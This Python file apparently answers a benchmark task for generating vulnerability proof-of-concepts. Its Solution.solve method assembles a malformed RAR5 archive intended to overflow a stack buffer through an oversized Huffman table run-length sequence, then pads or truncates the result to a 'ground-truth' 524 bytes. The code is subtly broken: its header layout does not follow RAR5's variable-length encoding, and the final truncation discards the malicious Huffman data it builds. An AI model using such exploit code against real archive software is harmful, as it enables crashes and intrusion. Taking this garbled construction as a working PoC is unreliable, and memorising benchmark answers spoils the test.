import struct
import os

class Solution:
    def solve(self, src_path: str) -> bytes:
        # RAR5 signature
        rar_signature = b"Rar!\x1A\x07\x01\x00"
        
        # Archive header (type 0x01)
        archive_header = (
            b"\x8C\x1A\x0C\x00"  # CRC32 (ignored for PoC)
            b"\x0D\x00"          # Header size = 13
            b"\x01"              # Header type = 0x01 (archive header)
            b"\x00\x00"          # Flags = 0
            b"\x00\x00"          # Extra size = 0
            b"\x00\x00"          # Reserved1 = 0
            b"\x00\x00\x00\x00"  # Reserved2 = 0
        )
        
        # File header (type 0x03) with minimal compression
        file_header = (
            b"\x00\x00\x00\x00"  # CRC32 (ignored)
            b"\x1A\x00"          # Header size = 26
            b"\x03"              # Header type = 0x03 (file header)
            b"\x01\x00"          # Flags = 0x0001 (extra area exists)
            b"\x00\x00"          # Extra size = 0 (will be overwritten)
            b"\x00\x00\x00\x00\x00\x00\x00\x00"  # Unpacked size = 0
            b"\x00\x00\x00\x00"  # File attributes = 0
            b"\x00\x00\x00\x00"  # CRC32 = 0
            b"\x30\x00\x00\x00"  # Compression info: method=0x30 (best), dict=0
            b"\x00"              # Host OS = Windows
            b"\x04\x00"          # Name length = 4
            b"test"              # File name
        )
        
        # Calculate actual file header with extra area
        extra_size = 0xFFFF  # Large extra area to trigger overflow
        file_header = file_header[:10] + struct.pack("<H", extra_size) + file_header[12:]
        
        # Block headers
        block_headers = (
            # Main block header
            b"\x00\x00\x00\x00"  # CRC32
            b"\x07\x00"          # Size = 7
            b"\x05"              # Type = 0x05 (service header)
            b"\x00\x00"          # Flags = 0
            b"\x02\x00"          # Extra size = 2
            b"\x01\x00"          # Service data
        )
        
        # Compressed file data designed to trigger Huffman table overflow
        compressed_data = b""
        
        # Huffman table block (type 0x06)
        huffman_header = (
            b"\x00\x00\x00\x00"  # CRC32
            b"\xFF\x03"          # Size = 1023 (will be adjusted)
            b"\x06"              # Type = 0x06 (huffman table)
            b"\x00\x00"          # Flags = 0
        )
        
        # Malformed Huffman table data
        # This exploits insufficient bounds checking during RLE decoding
        huffman_data = b""
        
        # First, create a valid-looking Huffman table start
        # 256 literals + 64 length codes = 320 entries
        huffman_data += b"\x01"  # Table type = 1 (main table)
        
        # Start with some valid RLE codes to pass initial checks
        huffman_data += b"\x00" * 16  # 16 zero bytes
        
        # Now add the malicious RLE sequence that causes overflow
        # The vulnerability: Run Length Encoding without proper bounds checking
        # We'll create a long run that exceeds the allocated buffer
        
        # Normal run length encoding uses nibbles:
        # High nibble: run type (0=zeros, 1=non-zero values)
        # Low nibble: run length-1 (0-15, with 15 meaning extended length)
        
        # Create an extended run that will overflow the stack buffer
        # First byte: run type = 1 (non-zero), length = 15 (0x1F)
        huffman_data += b"\x1F"
        
        # Extended length bytes: each 255 adds 255 to length, final byte adds remainder
        # We need a run long enough to overflow (at least 256 bytes beyond buffer)
        total_run_length = 600  # More than enough to overflow 256-byte buffer
        
        # Calculate extended length bytes
        remaining = total_run_length - 15
        while remaining > 0:
            if remaining > 255:
                huffman_data += b"\xFF"
                remaining -= 255
            else:
                huffman_data += struct.pack("B", remaining)
                remaining = 0
        
        # Add the actual values for the run (all non-zero)
        huffman_data += b"\x01" * total_run_length
        
        # Add some padding to reach total size
        huffman_data += b"\x00" * (1023 - len(huffman_data) - 4)
        
        # Update huffman header with actual size
        huffman_size = len(huffman_data) + 4  # +4 for CRC field
        huffman_header = huffman_header[:4] + struct.pack("<H", huffman_size) + huffman_header[6:]
        
        # Assemble the complete RAR5 file
        poc = (
            rar_signature +
            archive_header +
            file_header +
            b"A" * extra_size +  # Large extra area to reach vulnerable code
            block_headers +
            huffman_header +
            huffman_data
        )
        
        # Pad to exactly 524 bytes (ground-truth length)
        if len(poc) < 524:
            poc += b"B" * (524 - len(poc))
        elif len(poc) > 524:
            poc = poc[:524]
        
        return poc
